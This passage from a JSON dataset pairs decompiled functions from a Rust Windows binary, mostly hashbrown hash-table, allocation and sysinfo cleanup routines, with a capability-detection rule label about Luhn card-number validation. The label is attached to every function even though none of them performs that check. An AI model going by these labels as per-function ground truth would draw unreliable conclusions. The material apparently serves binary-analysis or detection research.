        "decompiled_code": "\nint64_t sym.hashbrown::raw::RawTable_T_A_::get_mut::h822e361a6cec7342(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    ulong uStack32;\n    ulong *puStack24;\n    int64_t iStack16;\n    \n    // hashbrown::raw::RawTable<T,A>::get_mut::h822e361a6cec7342\n    puStack24 = &uStack32;\n    uStack32 = arg3;\n    iStack16 = arg1;\n    iVar1 = sym.hashbrown::raw::RawTableInner_A_::find_inner::hf355b5523df09d82(arg1, arg2, &puStack24, 0x44bed8);\n    if (iVar1 != 0) {\n        iVar1 = arg2 * -0x118 + *(arg1 + 8);\n    }\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + -0x118;\n    }\n    return iVar1;\n}\n",
        "token_count": 232
    },
    "f355b552": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong sym.hashbrown::raw::RawTableInner_A_::find_inner::hf355b5523df09d82\n                (uint64_t *arg1, uint64_t arg2, ulong arg3, int64_t arg4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int32_t iVar3;\n    char cVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    uint16_t uVar9;\n    uchar auVar10 [16];\n    uchar auVar11 [16];\n    char cVar13;\n    char cVar14;\n    char cVar15;\n    char cVar16;\n    char cVar17;\n    char cVar18;\n    char cVar19;\n    char cVar20;\n    char cVar21;\n    char cVar22;\n    char cVar23;\n    char cVar24;\n    char cVar25;\n    char cVar26;\n    char cVar27;\n    char cVar28;\n    uchar in_XMM8_Ba;\n    char cVar29;\n    uchar in_XMM8_Bb;\n    char cVar30;\n    uchar in_XMM8_Bc;\n    char cVar31;\n    uchar in_XMM8_Bd;\n    char cVar32;\n    uchar in_XMM8_Be;\n    char cVar33;\n    uchar in_XMM8_Bf;\n    char cVar34;\n    uchar in_XMM8_Bg;\n    char cVar35;\n    uchar in_XMM8_Bh;\n    char cVar36;\n    uchar in_XMM8_Bi;\n    char cVar37;\n    uchar in_XMM8_Bj;\n    char cVar38;\n    uchar in_XMM8_Bk;\n    char cVar39;\n    uchar in_XMM8_Bl;\n    char cVar40;\n    uchar in_XMM8_Bm;\n    char cVar41;\n    uchar in_XMM8_Bn;\n    char cVar42;\n    uchar in_XMM8_Bo;\n    char cVar43;\n    uchar in_XMM8_Bp;\n    char cVar44;\n    uint8_t uVar12;\n    \n    // hashbrown::raw::RawTableInner<A>::find_inner::hf355b5523df09d82\n    uVar1 = *arg1;\n    uVar2 = arg1[1];\n    uVar7 = uVar1 & arg2;\n    uVar6 = arg2 >> 0x39;\n    uVar9 = arg2 >> 0x39;\n    auVar10 = CONCAT142(SUB1614((ZEXT1316(SUB1613((ZEXT1216(SUB1612((ZEXT1116(SUB1611((ZEXT1016(0 & SUB1610(\n                                                            0xff00ffffffffffff >> 0x30, 0)) << 0x30) >> 0x28, 0) &\n                                                            SUB1611(0xffff00ffffffffff >> 0x28, 0)) << 0x28) >> 0x20, 0)\n                                                            & SUB1612(0xffffff00ffffffff >> 0x20, 0)) << 0x20) >> 0x18, \n                                                  0) & SUB1613(0xffffffff00ffffff >> 0x18, 0)) << 0x18) >> 0x10, 0) &\n                        SUB1614(0xffffffffff00ffff >> 0x10, 0), uVar9 | uVar9 << 8);\n    auVar10 = pshuflw(auVar10, auVar10, 0);\n    cVar13 = SUB161(auVar10, 0);\n    cVar14 = SUB161(auVar10 >> 8, 0);\n    cVar15 = SUB161(auVar10 >> 0x10, 0);\n    cVar16 = SUB161(auVar10 >> 0x18, 0);\n    iVar3 = -(CONCAT13(in_XMM8_Bd, CONCAT12(in_XMM8_Bc, CONCAT11(in_XMM8_Bb, in_XMM8_Ba))) ==\n             CONCAT13(in_XMM8_Bd, CONCAT12(in_XMM8_Bc, CONCAT11(in_XMM8_Bb, in_XMM8_Ba))));\n    cVar29 = iVar3;\n    cVar30 = iVar3 >> 8;\n    cVar31 = iVar3 >> 0x10;\n    cVar32 = iVar3 >> 0x18;\n    iVar3 = -(CONCAT13(in_XMM8_Bh, CONCAT12(in_XMM8_Bg, CONCAT11(in_XMM8_Bf, in_XMM8_Be))) ==\n             CONCAT13(in_XMM8_Bh, CONCAT12(in_XMM8_Bg, CONCAT11(in_XMM8_Bf, in_XMM8_Be))));\n    cVar33 = iVar3;\n    cVar34 = iVar3 >> 8;\n    cVar35 = iVar3 >> 0x10;\n    cVar36 = iVar3 >> 0x18;\n    iVar3 = -(CONCAT13(in_XMM8_Bl, CONCAT12(in_XMM8_Bk, CONCAT11(in_XMM8_Bj, in_XMM8_Bi))) ==\n             CONCAT13(in_XMM8_Bl, CONCAT12(in_XMM8_Bk, CONCAT11(in_XMM8_Bj, in_XMM8_Bi))));\n    cVar37 = iVar3;\n    cVar38 = iVar3 >> 8;\n    cVar39 = iVar3 >> 0x10;\n    cVar40 = iVar3 >> 0x18;\n    iVar3 = -(CONCAT13(in_XMM8_Bp, CONCAT12(in_XMM8_Bo, CONCAT11(in_XMM8_Bn, in_XMM8_Bm))) ==\n             CONCAT13(in_XMM8_Bp, CONCAT12(in_XMM8_Bo, CONCAT11(in_XMM8_Bn, in_XMM8_Bm))));\n    cVar41 = iVar3;\n    cVar42 = iVar3 >> 8;\n    cVar43 = iVar3 >> 0x10;\n    cVar44 = iVar3 >> 0x18;\n    iVar8 = 0;\n    cVar17 = cVar13;\n    cVar18 = cVar14;\n    cVar19 = cVar15;\n    cVar20 = cVar16;\n    cVar21 = cVar13;\n    cVar22 = cVar14;\n    cVar23 = cVar15;\n    cVar24 = cVar16;\n    cVar25 = cVar13;\n    cVar26 = cVar14;\n    cVar27 = cVar15;\n    cVar28 = cVar16;\n    do {\n        auVar10 = *(uVar2 + uVar7);\n        uVar12 = -(SUB161(auVar10 >> 0x78, 0) == cVar28);\n        auVar11 = CONCAT115(uVar12, CONCAT114(-(SUB161(auVar10 >> 0x70, 0) == cVar27), \n                                              CONCAT113(-(SUB161(auVar10 >> 0x68, 0) == cVar26), \n                                                        CONCAT112(-(SUB161(auVar10 >> 0x60, 0) == cVar25), \n                                                                  CONCAT111(-(SUB161(auVar10 >> 0x58, 0) == cVar24), \n                                                                            CONCAT110(-(SUB161(auVar10 >> 0x50, 0) ==\n                                                                                       cVar23), \n                                                                                      CONCAT19(-(SUB161(auVar10 >> 0x48\n                                                                                                        , 0) == cVar22)\n                                                                                               , CONCAT18(-(SUB161(\n                                                            auVar10 >> 0x40, 0) == cVar21), \n                                                            CONCAT17(-(SUB161(auVar10 >> 0x38, 0) == cVar20), \n                                                                     CONCAT16(-(SUB161(auVar10 >> 0x30, 0) == cVar19), \n                                                                              CONCAT15(-(SUB161(auVar10 >> 0x28, 0) ==\n                                                                                        cVar18), \n                                                                                       CONCAT14(-(SUB161(auVar10 >> 0x20\n                                                                                                         , 0) == cVar17)\n                                                                                                , CONCAT13(-(SUB161(\n                                                            auVar10 >> 0x18, 0) == cVar16), \n                                                            CONCAT12(-(SUB161(auVar10 >> 0x10, 0) == cVar15), \n                                                                     CONCAT11(-(SUB161(auVar10 >> 8, 0) == cVar14), \n                                                                              -(SUB161(auVar10, 0) == cVar13))))))))))))\n                                                            ))));\n        uVar9 = SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf;\n        while (iVar5 = sym._ZN9hashbrown3raw7bitmask7BitMask14lowest_set_bit17h28cf3cd6f34533baE.362(uVar9),  iVar5 != 0\n              ) {\n            uVar9 = uVar9 - 1 & uVar9;\n            uVar6 = uVar6 + uVar7 & uVar1;\n            cVar4 = (**(arg4 + 0x20))(arg3, uVar6);\n            if (cVar4 != '\\0') {\n                return 1;\n            }\n        }\n        uVar12 = -(SUB161(auVar10 >> 0x78, 0) == cVar44);\n        auVar10 = CONCAT115(uVar12, CONCAT114(-(SUB161(auVar10 >> 0x70, 0) == cVar43), \n                                              CONCAT113(-(SUB161(auVar10 >> 0x68, 0) == cVar42), \n                                                        CONCAT112(-(SUB161(auVar10 >> 0x60, 0) == cVar41), \n                                                                  CONCAT111(-(SUB161(auVar10 >> 0x58, 0) == cVar40), \n                                                                            CONCAT110(-(SUB161(auVar10 >> 0x50, 0) ==\n                                                                                       cVar39), \n                                                                                      CONCAT19(-(SUB161(auVar10 >> 0x48\n                                                                                                        , 0) == cVar38)\n                                                                                               , CONCAT18(-(SUB161(\n                                                            auVar10 >> 0x40, 0) == cVar37), \n                                                            CONCAT17(-(SUB161(auVar10 >> 0x38, 0) == cVar36), \n                                                                     CONCAT16(-(SUB161(auVar10 >> 0x30, 0) == cVar35), \n                                                                              CONCAT15(-(SUB161(auVar10 >> 0x28, 0) ==\n                                                                                        cVar34), \n                                                                                       CONCAT14(-(SUB161(auVar10 >> 0x20\n                                                                                                         , 0) == cVar33)\n                                                                                                , CONCAT13(-(SUB161(\n                                                            auVar10 >> 0x18, 0) == cVar32), \n                                                            CONCAT12(-(SUB161(auVar10 >> 0x10, 0) == cVar31), \n                                                                     CONCAT11(-(SUB161(auVar10 >> 8, 0) == cVar30), \n                                                                              -(SUB161(auVar10, 0) == cVar29))))))))))))\n                                                            ))));\n        if ((SUB161(auVar10 >> 7, 0) & 1 | (SUB161(auVar10 >> 0xf, 0) & 1) << 1 | (SUB161(auVar10 >> 0x17, 0) & 1) << 2\n             | (SUB161(auVar10 >> 0x1f, 0) & 1) << 3 | (SUB161(auVar10 >> 0x27, 0) & 1) << 4 |\n             (SUB161(auVar10 >> 0x2f, 0) & 1) << 5 | (SUB161(auVar10 >> 0x37, 0) & 1) << 6 |\n             (SUB161(auVar10 >> 0x3f, 0) & 1) << 7 | (SUB161(auVar10 >> 0x47, 0) & 1) << 8 |\n             (SUB161(auVar10 >> 0x4f, 0) & 1) << 9 | (SUB161(auVar10 >> 0x57, 0) & 1) << 10 |\n             (SUB161(auVar10 >> 0x5f, 0) & 1) << 0xb | (SUB161(auVar10 >> 0x67, 0) & 1) << 0xc |\n             (SUB161(auVar10 >> 0x6f, 0) & 1) << 0xd | (SUB161(auVar10 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf)\n            != 0) {\n            return 0;\n        }\n        iVar5 = uVar7 + iVar8;\n        iVar8 = iVar8 + 0x10;\n        uVar7 = iVar5 + 0x10U & uVar1;\n    } while( true );\n}\n",
        "token_count": 3287
    },
    "a3cf9682": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::hash::Hasher::write_usize::ha3cf968243e64be5(ulong arg1, ulong arg2)\n\n{\n    ulong uStack8;\n    \n    // core::hash::Hasher::write_usize::ha3cf968243e64be5\n    uStack8 = arg2;\n    sym._core::hash::sip::Hasher_S__as_core::hash::Hasher_::write::h8176f034ddda3e7a(arg1, &uStack8, 8);\n    return;\n}\n",
        "token_count": 121
    },
    "b01598de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.alloc::slice::__impl__T__::to_vec_in::hb01598def8eef240(ulong *arg1, ulong arg2, int64_t arg3)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    \n    uVar2 = arg2;\n    // alloc::slice::_<impl [T]>::to_vec_in::hb01598def8eef240\n    uVar1 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::hcea65d7f5250fa5a(arg3);\n    *arg1 = uVar1;\n    arg1[1] = uVar2;\n    sym.memcpy(uVar1, arg2, arg3 * 2);\n    arg1[2] = arg3;\n    return;\n}\n",
        "token_count": 172
    },
    "ec06fb58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym.alloc::raw_vec::RawVec_T_A_::allocate_in::hec06fb58981cbb96(uint64_t arg1, ulong arg2)\n\n{\n    ulong arg1_00;\n    int64_t iVar1;\n    \n    // alloc::raw_vec::RawVec<T,A>::allocate_in::hec06fb58981cbb96\n    if (arg1 == 0) {\n        iVar1 = 8;\n    }\n    else {\n        arg1_00 = SUB168(ZEXT816(arg1) * ZEXT816(8), 0);\n        if (SUB168(ZEXT816(arg1) * ZEXT816(8) >> 0x40, 0) != 0) {\n            sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        if (arg2 == '\\0') {\n            iVar1 = sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_8allocate17h329e772386956f35E.350\n                              (arg1_00, 8);\n        }\n        else {\n            iVar1 = sym._ZN5alloc5alloc6Global10alloc_impl17hd38d3c93a0ea2d69E.351(arg1_00, 8);\n        }\n        if (iVar1 == 0) {\n            dbg.handle_alloc_error(arg1_00);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 344
    },
    "76031b31": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::hash::BuildHasher::hash_one::h76031b31976d9960(uint64_t arg1, uint64_t arg2, ulong *arg3)\n\n{\n    uchar uStack81;\n    uint64_t uStack80;\n    uint64_t uStack72;\n    ulong uStack64;\n    uint64_t uStack56;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    uint64_t uStack32;\n    uchar auStack24 [16];\n    \n    // core::hash::BuildHasher::hash_one::h76031b31976d9960\n    uStack56 = arg1 ^ 0x736f6d6570736575;\n    uStack40 = arg2 ^ 0x646f72616e646f6d;\n    uStack48 = arg1 ^ 0x6c7967656e657261;\n    auStack24 = ZEXT816(0);\n    uStack64 = 0;\n    uStack32 = arg2 ^ 0x7465646279746573;\n    uStack80 = arg1;\n    uStack72 = arg2;\n    sym._core::hash::sip::Hasher_S__as_core::hash::Hasher_::write::h8176f034ddda3e7a(&uStack80, *arg3, arg3[2]);\n    uStack81 = 0xff;\n    sym._core::hash::sip::Hasher_S__as_core::hash::Hasher_::write::h8176f034ddda3e7a(&uStack80, &uStack81, 1);\n    sym._std::collections::hash::map::DefaultHasher_as_core::hash::Hasher_::finish::h91b90874a8673c3f(&uStack80);\n    return;\n}\n",
        "token_count": 398
    },
    "2ae975c1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._alloc::vec::Vec_T_A__as_core::ops::drop::Drop_::drop::h2ae975c1214e7a77(int64_t *arg1)\n\n{\n    int64_t arg1_00;\n    int64_t iVar1;\n    \n    // <alloc::vec::Vec<T,A> as core::ops::drop::Drop>::drop::h2ae975c1214e7a77\n    arg1_00 = *arg1;\n    for (iVar1 = arg1[2] * 0x58; iVar1 != 0; iVar1 = iVar1 + -0x58) {\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(arg1_00);\n        sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Connection__::had4d00c9aeaf5a33\n                  (arg1_00 + 0x18);\n        arg1_00 = arg1_00 + 0x58;\n    }\n    return;\n}\n",
        "token_count": 250
    },
    "f4b19636": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_sysinfo::windows::component::Connection_::hf4b196367c8b12b6(ulong *arg1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    \n    // core::ptr::drop_in_place<sysinfo::windows::component::Connection>::hf4b196367c8b12b6\n    uStack48 = *(arg1 + 4);\n    uStack44 = *(arg1 + 0x24);\n    uStack40 = *(arg1 + 5);\n    uStack36 = *(arg1 + 0x2c);\n    arg1[4] = 0;\n    sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Enumerator__::hcf9e9d88b61ba464\n              (&uStack48);\n    uStack48 = *(arg1 + 2);\n    uStack44 = *(arg1 + 0x14);\n    uStack40 = *(arg1 + 3);\n    uStack36 = *(arg1 + 0x1c);\n    arg1[2] = 0;\n    sym._ZN4core3ptr94drop_in_place_LT_core..option..Option_LT_sysinfo..windows..component..ServerConnection_GT__GT_17h72763548619fad6\n              (&uStack48);\n    uStack48 = *arg1;\n    uStack44 = *(arg1 + 4);\n    uStack40 = *(arg1 + 1);\n    uStack36 = *(arg1 + 0xc);\n    *arg1 = 0;\n    sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Instance__::h1a43ba318d61a6af\n              (&uStack48);\n    sub.ole32.dll_CoUninitialize();\n    sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Instance__::h1a43ba318d61a6af(arg1);\n    sym._ZN4core3ptr94drop_in_place_LT_core..option..Option_LT_sysinfo..windows..component..ServerConnection_GT__GT_17h72763548619fad6\n              (arg1 + 2);\n    if ((arg1[4] != 0) && (arg1[5] != NULL)) {\n    // WARNING: Could not recover jumptable at 0x0043e85d. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*arg1[5] + 0x10))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 585
    },
    "90b2a9d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._alloc::vec::Vec_T_A__as_core::ops::drop::Drop_::drop::h90b2a9d036fee0ed(int64_t *arg1)\n\n{\n    int64_t arg1_00;\n    int64_t iVar1;\n    \n    // <alloc::vec::Vec<T,A> as core::ops::drop::Drop>::drop::h90b2a9d036fee0ed\n    arg1_00 = *arg1;\n    for (iVar1 = arg1[2] * 0x38; iVar1 != 0; iVar1 = iVar1 + -0x38) {\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(arg1_00);\n        sym.core::ptr::drop_in_place_alloc::vec::Vec_alloc::string::String__::h06728ccdb48f52e8(arg1_00 + 0x18);\n        arg1_00 = arg1_00 + 0x38;\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "4e92ad89": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.hashbrown::raw::RawTableInner_A_::free_buckets::h4e92ad8948d9d1b4(int64_t *arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    \n    // hashbrown::raw::RawTableInner<A>::free_buckets::h4e92ad8948d9d1b4\n    uVar1 = arg2 * (*arg1 + 1) + 0xfU & 0xfffffffffffffff0;\n    if (*arg1 + uVar1 == -0x11) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, arg1[1] - uVar1);\n    return;\n}\n",
        "token_count": 216
    },
    "3e18597b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym._hashbrown::map::IterMut_K_V__as_core::iter::traits::iterator::Iterator_::next::h3e18597bf5935f55\n                  (ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    // <hashbrown::map::IterMut<K,V> as core::iter::traits::iterator::Iterator>::next::h3e18597bf5935f55\n    iVar1 = sym._hashbrown::raw::RawIter_T__as_core::iter::traits::iterator::Iterator_::next::h474d36004fb7062b(arg1);\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + -0x88;\n    }\n    return iVar1;\n}\n",
        "token_count": 164
    },
    "c738472c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.hashbrown::raw::RawTableInner_A_::prepare_insert_slot::hc738472cab5bf402(uint64_t *arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint8_t uVar4;\n    \n    // hashbrown::raw::RawTableInner<A>::prepare_insert_slot::hc738472cab5bf402\n    iVar3 = sym.hashbrown::raw::RawTableInner_A_::find_insert_slot::h93b90925f579d537(arg1, arg2);\n    uVar1 = arg1[1];\n    uVar2 = *arg1;\n    uVar4 = arg2 >> 0x39;\n    *(uVar1 + iVar3) = uVar4;\n    *((iVar3 - 0x10U & uVar2) + 0x10 + uVar1) = uVar4;\n    return;\n}\n",
        "token_count": 208
    },
    "e109ed43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::ops::function::FnOnce::call_once_u7b__u7b_vtableshim_u7d__u7d_::he109ed43561eb374(uint *arg1, ulong arg2)\n\n{\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    // core::ops::function::FnOnce::call_once$u7b$$u7b$vtableshim$u7d$$u7d$::he109ed43561eb374\n    uStack16 = *arg1;\n    uStack12 = arg1[1];\n    uStack8 = arg1[2];\n    uStack4 = arg1[3];\n    sym.hashbrown::raw::RawTable_T_A_::find::__u7b__u7b_closure_u7d__u7d_::hf6a7ff3b28e18a68(&uStack16, arg2);\n    return;\n}\n",
        "token_count": 214
    },
    "14c5f543": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.hashbrown::raw::RawTableInner_A_::erase::h14c5f54342946935(uint64_t *arg1, int64_t arg2)\n\n{\n    char *pcVar1;\n    uint64_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    uchar uVar5;\n    uint16_t uVar6;\n    uint64_t uVar7;\n    int16_t iVar8;\n    uchar auVar9 [16];\n    \n    // hashbrown::raw::RawTableInner<A>::erase::h14c5f54342946935\n    uVar7 = arg2 - 0x10U & *arg1;\n    uVar2 = arg1[1];\n    pcVar1 = uVar2 + uVar7;\n    auVar9 = CONCAT115(-(pcVar1[0xf] == -1), \n                       CONCAT114(-(pcVar1[0xe] == -1), \n                                 CONCAT113(-(pcVar1[0xd] == -1), \n                                           CONCAT112(-(pcVar1[0xc] == -1), \n                                                     CONCAT111(-(pcVar1[0xb] == -1), \n                                                               CONCAT110(-(pcVar1[10] == -1), \n                                                                         CONCAT19(-(pcVar1[9] == -1), \n                                                                                  CONCAT18(-(pcVar1[8] == -1), \n                                                                                           CONCAT17(-(pcVar1[7] == -1), \n                                                                                                    CONCAT16(-(pcVar1[6]\n                                                                                                              == -1), \n                                                            CONCAT15(-(pcVar1[5] == -1), \n                                                                     CONCAT14(-(pcVar1[4] == -1), \n                                                                              CONCAT13(-(pcVar1[3] == -1), \n                                                                                       CONCAT12(-(pcVar1[2] == -1), \n                                                                                                CONCAT11(-(pcVar1[1] ==\n                                                                                                          -1), -(*pcVar1\n                                                                                                                == -1)))\n                                                                                      )))))))))))));\n    uVar3 = SUB161(auVar9 >> 7, 0) & 1 | (SUB161(auVar9 >> 0xf, 0) & 1) << 1 | (SUB161(auVar9 >> 0x17, 0) & 1) << 2 |\n            (SUB161(auVar9 >> 0x1f, 0) & 1) << 3 | (SUB161(auVar9 >> 0x27, 0) & 1) << 4 |\n            (SUB161(auVar9 >> 0x2f, 0) & 1) << 5 | (SUB161(auVar9 >> 0x37, 0) & 1) << 6 |\n            (SUB161(auVar9 >> 0x3f, 0) & 1) << 7 | (SUB161(auVar9 >> 0x47, 0) & 1) << 8 |\n            (SUB161(auVar9 >> 0x4f, 0) & 1) << 9 | (SUB161(auVar9 >> 0x57, 0) & 1) << 10 |\n            (SUB161(auVar9 >> 0x5f, 0) & 1) << 0xb | (SUB161(auVar9 >> 0x67, 0) & 1) << 0xc |\n            (SUB161(auVar9 >> 0x6f, 0) & 1) << 0xd | (SUB161(auVar9 >> 0x77, 0) & 1) << 0xe |\n            (-(pcVar1[0xf] == -1) >> 7) << 0xf;\n    pcVar1 = uVar2 + arg2;\n    auVar9 = CONCAT115(-(pcVar1[0xf] == -1), \n                       CONCAT114(-(pcVar1[0xe] == -1), \n                                 CONCAT113(-(pcVar1[0xd] == -1), \n                                           CONCAT112(-(pcVar1[0xc] == -1), \n                                                     CONCAT111(-(pcVar1[0xb] == -1), \n                                                               CONCAT110(-(pcVar1[10] == -1), \n                                                                         CONCAT19(-(pcVar1[9] == -1), \n                                                                                  CONCAT18(-(pcVar1[8] == -1), \n                                                                                           CONCAT17(-(pcVar1[7] == -1), \n                                                                                                    CONCAT16(-(pcVar1[6]\n                                                                                                              == -1), \n                                                            CONCAT15(-(pcVar1[5] == -1), \n                                                                     CONCAT14(-(pcVar1[4] == -1), \n                                                                              CONCAT13(-(pcVar1[3] == -1), \n                                                                                       CONCAT12(-(pcVar1[2] == -1), \n                                                                                                CONCAT11(-(pcVar1[1] ==\n                                                                                                          -1), -(*pcVar1\n                                                                                                                == -1)))\n                                                                                      )))))))))))));\n    uVar4 = SUB161(auVar9 >> 7, 0) & 1 | (SUB161(auVar9 >> 0xf, 0) & 1) << 1 | (SUB161(auVar9 >> 0x17, 0) & 1) << 2 |\n            (SUB161(auVar9 >> 0x1f, 0) & 1) << 3 | (SUB161(auVar9 >> 0x27, 0) & 1) << 4 |\n            (SUB161(auVar9 >> 0x2f, 0) & 1) << 5 | (SUB161(auVar9 >> 0x37, 0) & 1) << 6 |\n            (SUB161(auVar9 >> 0x3f, 0) & 1) << 7 | (SUB161(auVar9 >> 0x47, 0) & 1) << 8 |\n            (SUB161(auVar9 >> 0x4f, 0) & 1) << 9 | (SUB161(auVar9 >> 0x57, 0) & 1) << 10 |\n            (SUB161(auVar9 >> 0x5f, 0) & 1) << 0xb | (SUB161(auVar9 >> 0x67, 0) & 1) << 0xc |\n            (SUB161(auVar9 >> 0x6f, 0) & 1) << 0xd | (SUB161(auVar9 >> 0x77, 0) & 1) << 0xe |\n            (-(pcVar1[0xf] == -1) >> 7) << 0xf;\n    iVar8 = 0x10;\n    uVar6 = 0x10;\n    if (uVar3 != 0) {\n        uVar6 = 0xf;\n        if (uVar3 != 0) {\n            for (; uVar3 >> uVar6 == 0; uVar6 = uVar6 - 1) {\n            }\n        }\n        uVar6 = uVar6 ^ 0xf;\n    }\n    if ((uVar4 != 0) && (iVar8 = 0,  uVar4 != 0)) {\n        for (; (uVar4 >> iVar8 & 1) == 0; iVar8 = iVar8 + 1) {\n        }\n    }\n    uVar5 = 0x80;\n    if (iVar8 + uVar6 < 0x10) {\n        arg1[2] = arg1[2] + 1;\n        uVar5 = 0xff;\n    }\n    *(uVar2 + arg2) = uVar5;\n    *(uVar7 + 0x10 + uVar2) = uVar5;\n    arg1[3] = arg1[3] - 1;\n    return;\n}\n",
        "token_count": 1754
    },
    "b0d221b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::ops::function::FnOnce::call_once_u7b__u7b_vtableshim_u7d__u7d_::hb0d221b419970358(uint *arg1, ulong arg2)\n\n{\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    // core::ops::function::FnOnce::call_once$u7b$$u7b$vtableshim$u7d$$u7d$::hb0d221b419970358\n    uStack16 = *arg1;\n    uStack12 = arg1[1];\n    uStack8 = arg1[2];\n    uStack4 = arg1[3];\n    sym.hashbrown::raw::RawTable_T_A_::find::__u7b__u7b_closure_u7d__u7d_::h127771c7a2c5e1c1(&uStack16, arg2);\n    return;\n}\n",
        "token_count": 217
    },
    "ae243144": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
